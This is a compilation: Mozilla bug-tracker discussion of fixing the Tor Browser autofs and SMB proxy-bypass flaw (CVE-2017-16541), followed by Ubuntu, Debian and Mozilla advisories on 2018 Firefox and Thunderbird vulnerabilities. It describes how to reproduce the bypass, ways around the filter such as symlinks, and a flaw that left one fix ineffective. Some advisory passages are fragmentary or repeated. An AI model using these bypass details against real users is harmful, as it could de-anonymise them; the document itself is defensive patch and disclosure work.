OK, this can't be here. This was my main concern with the previous patch. This can potentially break things. It definitely changes behavior, is not behind the pref and definitely cannot be uplifted like this to ESR.
Move these lines INSIDE FilePreferences::IsAllowedPath and do it ONLY when there are names (prefixes) to be blacklisted or do the normalization as I do in my base patch (you will need the normalizer be a template and derive from TTokenizer<chat\_path\_t>, like #ifdef XPWIN typedef char16\_t char\_path\_t; #else typedef char char\_path\_t; #endif)
But I think this "has special dir -> throw" approach if fine when off by default.
OTOH, note that paths get here likely already normalized, at least on windows I could see that navigating to file:///c:/./././././././././././ is file://c:/ when coming to InitWithPath, no idea where that happens, but I made sure no smb request/lookup was triggered before InitWithPath was entered for file://///share uris.
hmm... we should make sure there is no code in upper layers that may look for /. or /.. in the path and call some system API normalization function that could trigger the smb/net lookup.
then, just for case, remember that ':' is a directory delimiter on osx!

I kept it nsCString to be able to still do path.Trim(" ")
Since this only happens once, at startup, the extra number of copies should be minimal.

Yes, but that depends on the blacklisted path. If the parent name is /folder and we blacklisted /folder/ it will not match, but all of its children will.

Fair enough. Note that I kept some of the changes in AppendRelativeNativePath:
Append('.') does nothing.
Append('..') throws NS\_ERROR\_FILE\_UNRECOGNIZED\_PATH just like the windows implementation, and as specified in nsIFile.idl
I think the fact that it was accepted was a bug.

I made the Normalizer a template instead.
We now build the fileBlacklist code on windows too, even though it does nothing.

I think this is done in nsLocalFile::Normalize().
However, on Linux it performs a call to the system realpath, which resolves relative paths and also links.

I'll keep this one around (to fix nsIFile.idl inconsistency) unless it breaks some tests.

Georg, let me know if the attached patch is OK.
Note that it depends on Honza's patch from [bug 1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb").
A few notes about the patch:
In order to block file access to "/net" you should add a pref (name:"network.file.path\_blacklist", value:"/net")
It does have one weakness: symlinks. For a given symlink A that is not blacklisted it is impossible to know if its target B is blacklisted or not.Flags: needinfo?(gk)

Turns out it broke some tests. :)
test\_bug1056939.js tested files that contained .. in them.
test\_file\_equality.js checks that appending . gives you a different file.
I filed [bug 1469737](/show_bug.cgi?id=1469737 "NEW") for this.
I also fixed the nsTArray\_base leak at shutdown.

Do you have one rebased against ESR60 handy by chance? I get a bunch of conflicts in FilePreferences.cpp when trying to apply your patch. I'll try to resolve them but I am a bit nervous about the correctness of the result.

What does that mean in practise? If an attacker is pointing to symlink A the proxy bypass we try to avoid is getting triggered?Flags: needinfo?(gk) → needinfo?(valentin.gosu)

It means that if the attacker can create a symlink that points to B, or if the attacker is aware of A that points to B, they could potentially bypass the filter. That seems unlikely to me, but it's important to keep in mind.

That one works for us, thanks so much! (The one you pointed me to in comment:83 still shows the problem. It took me a while to figure out what was going on :) )
I am not sure about the symlink issue yet. While I am not worried about the attacker being able to create a symlink I feel it should not be possible for arbitrary (third-party) web content to trigger any proxy bypass in case the user has told the browser "hey, for any web-related traffic, please use proxy $foo", irrespective of how the machine of the user outside of the browser is configured. This does not block our alpha release, but we should think about it while we progress towards getting Tor Browser 8 into stable shape.

Nathan, can you take a look at [attachment 8986337](/attachment.cgi?id=8986337 "patch") [[details]](/attachment.cgi?id=8986337&action=edit "patch") [[diff]](/attachment.cgi?id=8986337&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337) ?
I'm leaking an nsTArray\_base, sBlacklist, and I'm not exactly sure I'm using StaticAutoPtr correctly.
I've confirmed it's not sWhitelist by commenting it out: <https://treeherder.mozilla.org/#/jobs?repo=try&revision=064c72d8511a3fa831cef3282fb75930ad6acf93&selectedJob=184200087>

Talking to Valentin over IRC turned up two potential scenarios for sBlacklist to leak:
a) InitPrefs possibly getting called after sBlacklist has been released:
<https://hg.mozilla.org/try/rev/7fb190786695#l1.49>
So we're re-initializing prefs after shutdown...which seems quite unlikely.
b) Some sort of race in IsAllowedPath:
<https://hg.mozilla.org/try/rev/145bf576adf9#l1.358>
T1: In IsAllowedPath, check for the presence of sBlacklist
T1: sBlacklist is there, proceed
T2: clear sBlacklist as we're going through shutdown
T1: Call PathBlacklist, which re-allocates sBlacklist and leaks
This race is plausible in [attachment 8986337](/attachment.cgi?id=8986337 "patch") [[details]](/attachment.cgi?id=8986337&action=edit "patch") [[diff]](/attachment.cgi?id=8986337&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337) (though we really should have some checking in the ClearOnShutdown machinery to catch this sort of thing), but the try push actually changes things in IsAllowedPath:
<https://hg.mozilla.org/try/file/5c706ce50459/xpcom/io/FilePreferences.cpp#l267>
so that we don't try reallocating...but in that case, we should hit some sort of null pointer dereference if the race was really happening.
I tried getting a handle on where the allocated nsTArray\_base was coming from, but the debugging infrastructure we had for that blew up in my face.
So now I'm not sure where the leak is coming from. =/

This call gated by ifdef OS\_WIN - so on Linux it would leak objects that were supposed to be ClearOnShutdown in the plugin process

Before these calls we have CHECK\_mPath which checks FilePreferences::IsAllowedPath()

Add ability to blacklist file paths on Unix platforms
Approval Request Comment
[Feature/Bug causing the regression]:
TOR requirement to block access to certain paths on the filesystem
[User impact if declined]:
A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.
[Is this code covered by automated tests?]:
The patch includes a gtest
[Has the fix been verified in Nightly?]:
Yes
[Needs manual test from QE? If yes, steps to reproduce]:
Reproduce [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Set network.file.path\_blacklist to /net. Restart the browser. Check that the bug is fixed.
[List of other uplifts needed for the feature/fix]:
[attachment 8990057](/attachment.cgi?id=8990057 "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[details]](/attachment.cgi?id=8990057&action=edit "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[diff]](/attachment.cgi?id=8990057&action=diff "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057) to avoid leaks in the plugin process.
[Is the change risky?]:
Low risk
[Why is the change risky/not risky?]:
The patch only produces effects when the pref is set, which will probably only affect TOR.
[String changes made/needed]:
None.Flags: needinfo?(valentin.gosu)

[ESR60] patch
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Required in TOR.
User impact if declined:
[TOR] A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.
Fix Landed on Version:
Firefox 63 with an uplift requested for beta 62.
Risk to taking this patch (and alternatives if risky):
Low risk. Functionality is only enabled with the hidden pref set, which would be only in TOR.
String or UUID changes made by this patch:
None.

With the steps from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") mostly.
I used 2 different stations. One was on mac and the other on Ubuntu.
On mac I created the pref from [comment 103](/show_bug.cgi?id=1412081#c103 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (network.file.path\_blacklist set to /net). I changed the proxy and port and I opened the link from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (<https://pearlcrescent.com/tor/am.html>).
On Ubuntu, I opened Firefox, changed the pref and port and then in the terminal I wrote the command "sudo tcpdump port 111".
Did I do everything wrong? Maybe I didn't understand fully what I have to do, because I got the same behaviour on the old builds as on the latest Nightly.Flags: needinfo?(oana.botisan)

I am not sure regarding macOS but on Linux you need to install the autofs package and uncomment the line "/net -hosts" in /etc/auto.master first as a preparation step. When testing our backport for this patch I configured Tor as a proxy (just installing Tor via your package manager should suffice and then entering 127.0.0.1:9050 as the SOCKS proxy host/port) and then looked at my local wireshark output. Hope this helps. Let me know if not.Flags: needinfo?(arthuredelstein)

The leaks are caused by the fact that [attachment 8990057](/attachment.cgi?id=8990057 "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[details]](/attachment.cgi?id=8990057&action=edit "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[diff]](/attachment.cgi?id=8990057&action=diff "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057) should also land with the ESR patch.

Valentin, there seems to be some kind of discrepancy between our code base and the tore code base on ESR60 (IIUC).
Our code (the current, latest changeset):
<https://hg.mozilla.org/releases/mozilla-esr60/annotate/8a1e8be23bad/xpcom/io/FilePreferences.cpp#l263>
Tor code:
(patch) <https://gitweb.torproject.org/user/richard/tor-browser.git/commit/xpcom/io/FilePreferences.cpp?h=bug_26874&id=50f4653b90316394e7d6d3cd4a3e92e12f377666>
(file) <https://gitweb.torproject.org/user/richard/tor-browser.git/tree/xpcom/io/FilePreferences.cpp?h=bug_26874&id=50f4653b90316394e7d6d3cd4a3e92e12f377666#n263>
Please see [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868#c70](/show_bug.cgi?id=1413868#c70 "RESOLVED FIXED - proxy bypass on windows via smb") for further details. They claim that the patches don't work and removing the |if (!sWhitelist) { return false; }| part fixes it.
It may be that AllowUNCDirectory() which ensures sWhitelist is not called from some reason.
Maybe we should change the code to block all unc paths when sWhitelist is null and sBlockUNCPaths == true?
It's hard to track what's actually correct with all the backouts and merges.
Note: <https://dxr.mozilla.org/mozilla-esr60/> is out of sync ://Flags: needinfo?(valentin.gosu)

Ok I have access now!
Yeah so the issue here is that sWhitelist is only populated after a call to PathWhitelist(). The various directories are whitelisted during firefox init (and sWhitelist is populated) in AllowUNCDirectory(char const\*) by way of InitDirectoriesWhitelist(). However, the call to PathWhitelist() does not occur until the end of AllowUNCDirectory(), and only if the directory resolves to an SMB path (ie, begins with \\). So, unless one of the special dirs live on an SMB share, sWhitelist will never be populated, and the call to IsBlockedUNCPath() will always early out due to the !sWhiteList check.
The !sWhitelist check should be removed, since the underlying pointer is never accessed directly, and always through the PathWhitelist() getter/initializer.
I've a screenshot ( here: [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb") ) demoing the proxy bypass still exists in ESR60 on Windows 7.

I think that's because TOR landed the patch in before [comment 89](/show_bug.cgi?id=1412081#c89 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") ([attachment 8986596](/attachment.cgi?id=8986596 "[ESR60]  patch") [[details]](/attachment.cgi?id=8986596&action=edit "[ESR60]  patch") [[diff]](/attachment.cgi?id=8986596&action=diff "[ESR60]  patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986596)) and the ESR patch landed a bit later, with a few nits.
The version in m-c actually does not contain the sWhitelist thing, since the leak didn't happen on Windows, so I assume we should probably update TOR and ESR.

# USN-3793-1: Thunderbird vulnerabilities

15 October 2018

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

or execute arbitrary code. ([CVE-2018-12376](/security/CVE-2018-12376), [CVE-2018-12377](/security/CVE-2018-12377),

[CVE-2018-12378](/security/CVE-2018-12378))

It was discovered that if a user saved passwords before Thunderbird 58 and

then later set a master password, an unencrypted copy of these passwords

would still be accessible. A local user could exploit this to obtain

sensitive information. ([CVE-2018-12383](/security/CVE-2018-12383))

A crash was discovered in TransportSecurityInfo used for SSL, which could

be triggered by data stored in the local cache directory. An attacker

could potentially exploit this in combination with another vulnerability

that allowed them to write data to the cache, to execute arbitrary code.

([CVE-2018-12385](/security/CVE-2018-12385))

Multiple security issues have been found in Thunderbird: Multiple memory
safety errors and use-after-frees may lead to the execution of arbitrary
code or denial of service.

Debian follows the Thunderbird upstream releases. Support for the 52.x
series has ended, so starting with this update we're now following the
60.x releases.

Between 52.x and 60.x, Thunderbird has undergone significant internal
updates, which makes it incompatible with a number of extensions. For
more information please refer to
<https://support.mozilla.org/en-US/kb/new-thunderbird-60>

For Debian 8 "Jessie", these problems have been fixed in version
1:60.3.0-1~deb8u1.

We recommend that you upgrade your thunderbird packages.

these updates to your system and frequently asked questions can be

Reporter
Philipp
Impact
moderate
##### Description

A potentially exploitable crash in `TransportSecurityInfo` used for SSL can be triggered by data stored in the local cache in the user profile directory. This issue is only exploitable in combination with another vulnerability allowing an attacker to write data into the local cache or from locally installed malware. This issue also triggers a non-exploitable startup crash for users switching between the Nightly and Release versions of Firefox if the same profile is used.

opened a malicious website.

### Reduce your security exposure

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)
* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [firefox](/security/cves?package=firefox) - Mozilla Open Source web browser

## Details

A crash was discovered in TransportSecurityInfo used for SSL, which could

be triggered by data stored in the local cache directory. An attacker

could potentially exploit this in combination with another vulnerability

that allowed them to write data to the cache, to execute arbitrary code.

([CVE-2018-12385](/security/CVE-2018-12385))

A type confusion bug was discovered in JavaScript. If a user were tricked

in to opening a specially crafted website, an attacker could exploit this

to cause a denial of service, or execute arbitrary code. ([CVE-2018-12386](/security/CVE-2018-12386))

It was discovered that the Array.prototype.push could leak memory

addresses to the calling function in some circumstances. An attacker could

exploit this in combination with another vulnerability to help execute

arbitrary code. ([CVE-2018-12387](/security/CVE-2018-12387))
